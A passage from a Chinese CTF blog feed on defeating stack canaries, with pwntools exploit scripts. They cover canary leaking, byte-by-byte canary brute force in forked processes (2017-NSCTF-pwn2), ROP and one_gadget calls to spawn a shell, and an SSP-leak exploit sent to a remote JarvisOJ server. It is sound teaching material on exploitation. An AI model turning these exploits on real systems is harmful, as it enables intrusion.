class="line">log.success(<span class="string">'str_bin_sh = '</span> + hex(str_bin_sh))</span><br><span class="line">edit(<span class="string">'A'</span> * <span class="number">168</span> + <span class="string">':'</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">canary = u64(<span class="string">'\x00'</span> + p.recv(<span class="number">7</span>))</span><br><span class="line">log.success(<span class="string">'canary = '</span> + hex(canary))</span><br><span class="line">payload = flat([</span><br><span class="line"><span class="string">'A'</span> * <span class="number">168</span>, </span><br><span class="line">canary, </span><br><span class="line"><span class="string">'B'</span> * <span class="number">8</span>, </span><br><span class="line">pop_rdi_ret, </span><br><span class="line">str_bin_sh, </span><br><span class="line">system</span><br><span class="line">])</span><br><span class="line">edit(payload)</span><br><span class="line">quit()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="爆破Canary"><a href="#爆破Canary" class="headerlink" title="爆破Canary"></a>爆破<code>Canary</code></h2><p><code>Canary</code>之所以被认为是安全的，是因为对其进行爆破成功率太低。以32位程序为例，除去最后一个<code>\x00</code>，其可能值将会是<code>0x100^3=16777216</code>（实际上由于<code>Canary</code>的生成规则会小于这个值），64位下的<code>Canary</code>值更是远大于这个数量级。此外，一旦<code>Canary</code>爆破失败，程序就会立即结束，<code>Canary</code>值也会再次更新，使得爆破更加困难。但是同一个进程内所有的<code>Canary</code>值都是一致的，当程序有多个进程，且子进程内出现了栈溢出时，由于子进程崩溃不会影响到主进程，我们就可以进行爆破。甚至我们可以通过逐位爆破来减少爆破时间。</p><h3 id="2017-NSCTF-pwn2"><a href="#2017-NSCTF-pwn2" class="headerlink" title="2017-NSCTF-pwn2"></a>2017-NSCTF-pwn2</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] '/home/assassinq/pwn/ctf-wiki/canary/2017-NSCTF-pwn2/pwn2'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>开启了<code>Canary</code>。main函数中看到只要每次回答<code>Y</code>，可以无限次地fork出新的进程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [esp+1Bh] [ebp-5h]</span></span><br><span class="line">  <span class="keyword">__pid_t</span> pid; <span class="comment">// [esp+1Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"[*] Do you love me?[Y]\n"</span>, <span class="number">0x17</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( getchar() != <span class="string">'Y'</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v1 = getchar();</span><br><span class="line">    <span class="keyword">while</span> ( v1 != <span class="string">'\n'</span> &amp;&amp; v1 )</span><br><span class="line">      ;</span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span> ( pid )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( pid &lt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( pid &lt; <span class="number">0</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>                                      <span class="comment">// son</span></span><br><span class="line">      &#123;</span><br><span class="line">        wait(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>                                        <span class="comment">// father</span></span><br><span class="line">    &#123;</span><br><span class="line">      func();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>func()</code>函数中存在<code>buffer overflow</code>，而且还存在<code>format string</code>，那这里其实是可以用这个漏洞泄漏出<code>Canary</code>的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *s; <span class="comment">// ST18_4</span></span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [esp+1Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+20h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+24h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+28h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  buf = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  s = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);</span><br><span class="line">  input_name(&amp;buf);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">"[*] Welcome to the game %s"</span>, &amp;buf);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[*] Input Your Id:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Canary</code>采用爆破的方法，libc则可以用格式化字符串泄漏。放上逐字节爆破exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">p = process(<span class="string">'./pwn2'</span>, env=&#123;<span class="string">'LD_RELOAD'</span>:<span class="string">'./libc.so.6_x86'</span>&#125;)</span><br><span class="line">elf = ELF(<span class="string">'./pwn2'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6_x86'</span>)</span><br><span class="line">system_offset = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">str_bin_sh_offset = next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line">log.success(<span class="string">'system_offset = '</span> + hex(system_offset))</span><br><span class="line">log.success(<span class="string">'str_bin_sh_offset = '</span> + hex(str_bin_sh_offset))</span><br><span class="line">libc_offset = <span class="number">0x1b2000</span></span><br><span class="line">log.success(<span class="string">'libc_offset = '</span> + hex(libc_offset))</span><br><span class="line">one_gadget_offset = <span class="number">0x3af1c</span></span><br><span class="line">log.success(<span class="string">'one_gadget_offset = '</span> + hex(one_gadget_offset))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">forkNew</span><span class="params">()</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'[Y]'</span>, <span class="string">'Y'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inputName</span><span class="params">(name)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'[*] Input Your name please:'</span>)</span><br><span class="line">p.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inputId</span><span class="params">(Id)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'[*] Input Your Id:'</span>)</span><br><span class="line">p.send(Id)</span><br><span class="line"></span><br><span class="line">canary = <span class="string">'\x00'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line"><span class="comment"># log.info('try ' + hex(j))</span></span><br><span class="line"><span class="keyword">if</span> i != <span class="number">0</span> <span class="keyword">and</span> j == <span class="number">0</span>:</span><br><span class="line">p.sendline(<span class="string">'Y'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">forkNew()</span><br><span class="line">inputName(<span class="string">'%12$p\n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'[*] Welcome to the game '</span>)</span><br><span class="line">leak_addr = int(p.recv(<span class="number">10</span>), <span class="number">16</span>)</span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">16</span></span><br><span class="line">payload += canary</span><br><span class="line">payload += chr(j)</span><br><span class="line">inputId(payload)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="keyword">if</span> <span class="string">'smashing'</span> <span class="keyword">not</span> <span class="keyword">in</span>  p.recv():</span><br><span class="line">canary += chr(j)</span><br><span class="line">log.info(<span class="string">'At round %d find canary byte %#x'</span> %(i, j))</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'canary = '</span> + hex(u32(canary)))</span><br><span class="line">log.success(<span class="string">'leak_addr = '</span> + hex(leak_addr))</span><br><span class="line">libc_base = leak_addr - libc_offset</span><br><span class="line">log.success(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line">system = libc_base + system_offset</span><br><span class="line">str_bin_sh = libc_base + str_bin_sh_offset</span><br><span class="line">one_gadget = libc_base + one_gadget_offset</span><br><span class="line">log.success(<span class="string">'system = '</span> + hex(system))</span><br><span class="line">log.success(<span class="string">'str_bin_sh = '</span> + hex(str_bin_sh))</span><br><span class="line">log.success(<span class="string">'one_gadget = '</span> + hex(one_gadget))</span><br><span class="line">p.sendline(<span class="string">'Y'</span>)</span><br><span class="line">inputName(<span class="string">'AssassinQ\n'</span>)</span><br><span class="line">payload = flat([</span><br><span class="line"><span class="string">'A'</span> * <span class="number">16</span>, </span><br><span class="line">canary, </span><br><span class="line"><span class="string">'B'</span> * <span class="number">12</span>, </span><br><span class="line">one_gadget</span><br><span class="line">])</span><br><span class="line">inputId(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="SSP（Stack-Smashing-Protect）-Leak"><a href="#SSP（Stack-Smashing-Protect）-Leak" class="headerlink" title="SSP（Stack Smashing Protect） Leak"></a><code>SSP（Stack Smashing Protect） Leak</code></h2><p>除了通过各种方法泄露<code>Canary</code>之外，我们还可以利用<code>__stack_chk_fail</code>函数泄露信息。这种方法作用不大，没办法让我们<code>get shell</code>。但是当我们需要泄露的flag或者其他东西存在于内存中时，我们可能可以使用一个栈溢出漏洞来把它们泄露出来。这个方法叫做<code>SSP（Stack Smashing Protect） Leak</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">"stack smashing detected"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/pics/绕过ELF的安全防护机制Canary/1.png" alt="SSP Leak"></p><h3 id="JarvisOJ-Smashes"><a href="#JarvisOJ-Smashes" class="headerlink" title="JarvisOJ-Smashes"></a>JarvisOJ-Smashes</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] '/home/assassinq/pwn/ctf-wiki/canary/JarvisOJ-Smashes/smashes'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>开了<code>Canary</code>，存在溢出但是没法泄漏：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">sub_4007E0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 i; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> c; <span class="comment">// eax</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+0h] [rbp-128h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+108h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, <span class="string">"Hello!\nWhat's your name? "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !_IO_gets((__int64)&amp;v3) )</span><br><span class="line">LABEL_9:</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">  i = <span class="number">0L</span>L;</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, <span class="string">"Nice to meet you, %s.\nPlease overwrite the flag: "</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    c = _IO_getc(<span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> ( c == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">    <span class="keyword">if</span> ( c == <span class="string">'\n'</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    flag[i++] = c;</span><br><span class="line">    <span class="keyword">if</span> ( i == <span class="number">32</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>((<span class="keyword">void</span> *)((<span class="keyword">signed</span> <span class="keyword">int</span>)i + <span class="number">6294816L</span>L), <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="number">32</span> - i));</span><br><span class="line">LABEL_8:</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Thank you, bye!"</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里想到<code>SSP Leak</code>，只要我们能够输入足够长的字符串覆盖掉<code>argv[0]</code>，我们就能让<code>Canary</code>保护输出我们想要地址上的值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rodata:000000000040094E ; char s[]</span><br><span class="line">.rodata:000000000040094E s               db &apos;Thank you, bye!&apos;,0  ; DATA XREF: sub_4007E0:loc_400878↑o</span><br><span class="line">.rodata:000000000040095E                 align 20h</span><br></pre></td></tr></table></figure><p>尝试输出字符串s：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = remote(<span class="string">'pwn.jarvisoj.com'</span>, <span class="number">9877</span>)</span><br><span class="line">test = <span class="number">0x40094E</span></span><br><span class="line">p.recvuntil(<span class="string">'What\'s your name?'</span>)</span><br><span class="line">p.sendline(p64(test) * <span class="number">200</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Please overwrite the flag:'</span>)</span><br><span class="line">p.sendline()</span><br><span class="line">p.recvall()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>得到的结果果然泄漏出来了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x4c bytes:</span><br><span class="line">    'Thank you, bye!\n'</span><br><span class="line">    '*** stack smashing detected ***: Thank you, bye! terminated\n'</span><br></pre></td></tr></table></figure><p>那么接下来需要做的就是找到存放flag的地址，在ida上找到是<code>0x600d21</code>，但是由于main函数中最后一句话<code>memset((void *)((signed int)i + 6294816LL), 0, (unsigned int)(32 - i));</code>，在调用<code>__stack_chk_fail()</code>的时候，<code>0x600d21</code>上的值早就已经被覆盖成其它值了。通过gdb调试，发现在另一个地址也有flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; find &apos;CTF&apos;</span><br><span class="line">Searching for &apos;CTF&apos; in: None ranges</span><br><span class="line">Found 2 results, display max 2 items:</span><br><span class="line">smashes : 0x400d21 (&quot;CTF&#123;Here&apos;s the flag on server&#125;&quot;)</span><br><span class="line">smashes : 0x600d21 (&quot;CTF&#123;Here&apos;s the flag on server&#125;&quot;)</span><br></pre></td></tr></table></figure><p>这里就涉及到了elf文件的重映射，当可执行文件足够小的时候，文件的不同区段可能会被多次映射：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; vmmap </span><br><span class="line">Start              End                PermName</span><br><span class="line">0x00400000         0x00401000         r-xp/home/assassinq/pwn/ctf-wiki/canary/JarvisOJ-Smashes/smashes</span><br><span class="line">0x00600000         0x00601000         rw-p/home/assassinq/pwn/ctf-wiki/canary/JarvisOJ-Smashes/smashes</span><br><span class="line">0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7bcd000 0x00007ffff7dcd000 ---p/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dcd000 0x00007ffff7dd1000 r--p/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd3000 0x00007ffff7dd7000 rw-pmapped</span><br><span class="line">0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp/lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7fd7000 0x00007ffff7fda000 rw-pmapped</span><br><span class="line">0x00007ffff7ff7000 0x00007ffff7ffa000 r--p[vvar]</span><br><span class="line">0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp[vdso]</span><br><span class="line">0x00007ffff7ffc000 0x00007ffff7ffd000 r--p/lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p/lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffe000 0x00007ffff7fff000 rw-pmapped</span><br><span class="line">0x00007ffffffde000 0x00007ffffffff000 rw-p[stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp[vsyscall]</span><br></pre></td></tr></table></figure><p>那么exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = remote(<span class="string">'pwn.jarvisoj.com'</span>, <span class="number">9877</span>)</span><br><span class="line">test = <span class="number">0x40094E</span></span><br><span class="line">flag = <span class="number">0x400d20</span></span><br><span class="line">p.recvuntil(<span class="string">'What\'s your name?'</span>)</span><br><span class="line">p.sendline(p64(flag) * <span class="number">200</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Please overwrite the flag:'</span>)</span><br><span class="line">p.sendline()</span><br><span class="line">p.recvall()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Auxiliary-Vector"><a href="#Auxiliary-Vector" class="headerlink" title="Auxiliary Vector"></a>Auxiliary Vector</h2><p>直接“挖”到canary产生的本源——AUXV(Auxiliary Vector)，并修改该结构体从而使canary值可控。</p><h3 id="2017-TCTF-Final-upxof"><a href="#2017-TCTF-Final-upxof" class="headerlink" title="2017-TCTF-Final-upxof"></a>2017-TCTF-Final-upxof</h3><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary/</a><br><a href="https://www.anquanke.com/post/id/85203" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85203</a><br><a href="https://bbs.ichunqiu.com/thread-44069-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-44069-1-1.html</a><br><a href="https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/" target="_blank" rel="noopener">https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/</a><br><a href="https://www.jianshu.com/p/c3624f5dd583" target="_blank" rel="noopener">https://www.jianshu.com/p/c3624f5dd583</a><br><a href="https://deadc0de.re/articles/microwave-write-up.html" target="_blank" rel="noopener">https://deadc0de.re/articles/microwave-write-up.html</a><br><a href="https://braddaniels.org/csaw-quals-2017-scv/" target="_blank" rel="noopener">https://braddaniels.org/csaw-quals-2017-scv/</a><br><a href="https://reversingpwn.wordpress.com/2017/09/18/writeup-csaw-2017-scv/" target="_blank" rel="noopener">https://reversingpwn.wordpress.com/2017/09/18/writeup-csaw-2017-scv/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;入门canary。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://qianfei11.github.io/tags/ctf/"/>
    
      <category term="pwn" scheme="https://qianfei11.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>为Windows系统鼠标右键添加软件和图标</title>
    <link href="https://qianfei11.github.io/2019/02/15/%E4%B8%BAWindows%E7%B3%BB%E7%BB%9F%E9%BC%A0%E6%A0%87%E5%8F%B3%E9%94%AE%E6%B7%BB%E5%8A%A0%E8%BD%AF%E4%BB%B6%E5%92%8C%E5%9B%BE%E6%A0%87/"/>
    <id>https://qianfei11.github.io/2019/02/15/为Windows系统鼠标右键添加软件和图标/</id>
    <published>2019-02-15T03:00:27.000Z</published>
    <updated>2019-02-15T03:32:47.877Z</updated>
    
